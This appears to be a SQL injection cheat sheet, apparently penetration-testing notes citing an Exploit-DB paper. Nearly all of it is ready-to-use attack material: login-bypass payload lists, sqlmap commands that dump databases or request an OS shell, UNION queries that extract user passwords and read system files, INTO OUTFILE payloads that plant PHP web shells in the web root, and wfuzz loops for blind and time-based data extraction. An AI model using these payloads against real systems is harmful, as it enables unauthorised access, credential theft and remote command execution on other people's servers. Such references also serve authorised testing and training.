[source](https://www.exploit-db.com/papers/12975)

### SQLI SQLInjection SQL Injection

```
' or '1'='1
-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x

root' --
root' #
root'/*
root' or '1'='1
root' or '1'='1'--
root' or '1'='1'#
root' or '1'='1'/*
root'or 1=1 or ''='
root' or 1=1
root' or 1=1--
root' or 1=1#
root' or 1=1/*
root') or ('1'='1
root') or ('1'='1'--
root') or ('1'='1'#
root') or ('1'='1'/*
root') or '1'='1
root') or '1'='1'--
root') or '1'='1'#
root') or '1'='1'/*
or 1=1
or 1=1--
or 1=1#
or 1=1/*
' or 1=1
' or 1=1--
' or 1=1#
' or 1=1/*
" or 1=1
" or 1=1--
" or 1=1#
" or 1=1/*
1234 ' AND 1=0 UNION ALL SELECT 'root', '81dc9bdb52d04dc20036dbd8313ed055
root" --
root" #
root"/*
root" or "1"="1
root" or "1"="1"--
root" or "1"="1"#
root" or "1"="1"/*
root" or 1=1 or ""="
root" or 1=1
root" or 1=1--
root" or 1=1#
root" or 1=1/*
root") or ("1"="1
root") or ("1"="1"--
root") or ("1"="1"#
root") or ("1"="1"/*
root") or "1"="1
root") or "1"="1"--
root") or "1"="1"#
root") or "1"="1"/*
```



#### sqlmap

```
sqlmap -u http://$IP_or_$DOMAIN/index.php?id=1 -p "id"
sqlmap -u http://$IP_or_$DOMAIN/index.php?id=1 -p "id" --dbms=mysql --dump
```

**attempt to launch shell**
```
sqlmap -u http://$IP_or_$DOMAIN/index.php?id=1 -p "id" --dbms=mysql --os-shell
```

#### Iterate process in burp

union to find cols being displayed

```
http://$IP_or_$DOMAIN/index.php?id=2 union all select 1, 2, 3

```
version

```
http://$IP_or_$DOMAIN/index.php?id=1 union all select 1, 2, @@version
http://$IP_or_$DOMAIN/index.php?id=2%20union%20all%20select%201,%202,%20@@version

```
user

```
http://$IP_or_$DOMAIN/index.php?id=1 union all select 1, 2,user()

```
table names

```
http://$IP_or_$DOMAIN/index.php?id=1 union all select 1, 2, table_name from information_schema.tables

```
user table

```
http://$IP_or_$DOMAIN/index.php?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'

```
extract user name and passwords

```
http://$IP_or_$DOMAIN/index.php?id=1 union all select 1, username, password from users

```
load file

```
http://$IP_or_$DOMAIN/index.php??id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')

```
create file using INTO OUTFILE

```
http://$IP_or_$DOMAIN/index.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'

```

#### SQL Injection

Windows running MSSQL wth SLUG input
```
' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/command.php'  -- -' 
```



```php
limit <row offset>,<number of rows>                          # display rows based on offset and number  

count(*)                                                     # display number of rows  

rand()                                                       # generate random number between 0 and 1 

floor(rand()*<number>)                                       # print out number part of random decimal number 

select(select database());                                   # double query (nested) using database() as an example 

group by <column name>                                       # summerize rows based on column name  

concat(<string1>, <string2>, ..)                             # concatenate strings such as tables, column names  

length(<string>)                                             # calculate the number of characters for given string 

substr(<string>,<offset>,<characters length>)                # print string character(s) by providing offset and length 

ascii(<character>)                                           # decimal representation of the character 

sleep(<number of seconds>)                                   # go to sleep for <number of seconds>

if(<condition>,<true action>,<false action>)                 # conditional if statement 

like "<string>%"                                             # checks if provided string present

outfile "<url to file>"                                      # dump output of select statement into a file

load_file("<url to file>")                                   # dump the content of file
```


Determine number of columns
```php
http://$IP_or_$DOMAIN/index.php?id=1 order by <number>
wfuzz -c -z range,1-10 "http://$IP_or_$DOMAIN/index.php?id=1 order by FUZZ"
```

Identify printable union columns 
```php
http://$IP_or_$DOMAIN/index.php?id=-1 union select <number of columns seperated by comma>
```

Dump the content of table
```php
http://$IP_or_$DOMAIN/index.php?id=-1')) union select <column1>,<column2> from <table name> into outfile "<url to file>" --+
```

Print back-end SQL assuming column 3 content gets diplayed
```php
http://$IP_or_$DOMAIN/index.php?id=-1 union select 1,2,@@version,4,...
```

Print user running the query
```php
http://$IP_or_$DOMAIN/index.php?id=-1 union select 1,2,user(),4,...
```

Print database name
```php
http://$IP_or_$DOMAIN/index.php?id=-1 union select 1,2,database(),4,...
```

Print database directory
```php
http://$IP_or_$DOMAIN/index.php?id=-1 union select 1,2,@@datadir,4,...
```

Print table names 
```php
http://$IP_or_$DOMAIN/index.php?id=-1 union select 1,2,group_concat(table_name),4,... from information_schema.tables where table_schema=database()
```

Print column names
```php
http://$IP_or_$DOMAIN/index.php?id=-1 union select 1,2,group_concat(column_name),4,... from information_schema.columns where table_name='<table name>'
```

Print content of column
```php
http://$IP_or_$DOMAIN/index.php?id=-1 union select 1,2,group_concat(<column name>),4,... from <table name>
```

Use `and` statement as substitute to reqular comments such as `--+`, `#`, and `/* */`
```php
http://$IP_or_$DOMAIN/index.php?id=1' <sqli here> and '1
```
Determine databsae name
```php
http://$IP_or_$DOMAIN/index.php?id=1' and (substr(database(),<offset>,<character length>))='<character>' --+
for i in $(seq 1 10); do wfuzz -c -z list,a-b-c-d-e-f-g-h-i-j-k-l-m-n-o-p-q-r-s-t-u-v-w-x-y-z --hw=<word count> "http://$IP_or_$DOMAIN/index.php?id=1' and (substr(database(),$i,1))='FUZZ' --+";done 
for i in $(seq 1 10); do wfuzz -c -z range,32-127 --hw=<word count> "http://$IP_or_$DOMAIN/index.php?id=1' and (ascii(substr(database(),$i,1)))=FUZZ --+";done 
```

Determine table name
```php
for i in $(seq 1 10); do wfuzz -c -z range,32-127 --hw=<word count> "http://$IP_or_$DOMAIN/index.php?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),$i,1)))=FUZZ --+";done # increment limit first argument by 1 to get the next available table name 
```

Determine column name
```php
for i in $(seq 1 10); do wfuzz -c -z range,32-127 --hw=<word count> "http://$IP_or_$DOMAIN/index.php?id=1' and (ascii(substr((select column_name from information_schema.columns where table_name=<table name> limit 0,1),$i,1)))=FUZZ --+";done # increment limit first argument by 1 to get the next available column name 
```

Confirm time-based
```php
http://$IP_or_$DOMAIN/index.php?id=1' and sleep(10) --+
```

Determine database version
```php
http://$IP_or_$DOMAIN/index.php?id=1' and if((select version()) like "5%", sleep(10), null) --+
```

Determine database name 
```php
for i in $(seq 1 10); do wfuzz -v -c -z range,32-127 "http://$IP_or_$DOMAIN/index.php?id=1' and if((ascii(substr(database(),$i,1)))=FUZZ, sleep(10), null) --+";done > <filename.txt> && grep "0m9" <filename.txt>
```

Determine table name 
```php
for i in $(seq 1 10); do wfuzz -v -c -z range,32-127 "http://$IP_or_$DOMAIN/index.php?id=1' and if((select ascii(substr(table_name,$i,1))from information_schema.tables where table_schema=database() limit 0,1)=FUZZ, sleep(10), null) --+";done > <filename.txt> && grep "0m9" <filename.txt> # increment limit first argument by 1 to get the next available table name 
```
Determine column name
```php
for i in $(seq 1 10); do wfuzz -v -c -z range,32-127 "http://$IP_or_$DOMAIN/index.php?id=1' and if((select ascii(substr(column_name,$i,1))from information_schema.columns where table_name='<table name>' limit 0,1)=FUZZ, sleep(10), null) --+";done > <filename.txt> && grep "0m9" <filename.txt> # increment limit first argument by 1 to get the next available column name 
```

Extract column content
```php
for i in $(seq 1 10); do wfuzz -v -c -z range,0-10 -z range,32-127 "http://$IP_or_$DOMAIN/index.php?id=1' and if(ascii(substr((select <column name> from <table name> limit FUZZ,1),$i,1))=FUZ2Z, sleep(10), null) --+";done > <filename.txt> && grep "0m9" <filename.txt> # change <column name> to get the content of next column
```

Other

```php
OR 3=3;#
OR 2=2 LIMIT 1;
OR 'a'='a
OR 1=1 --+
```
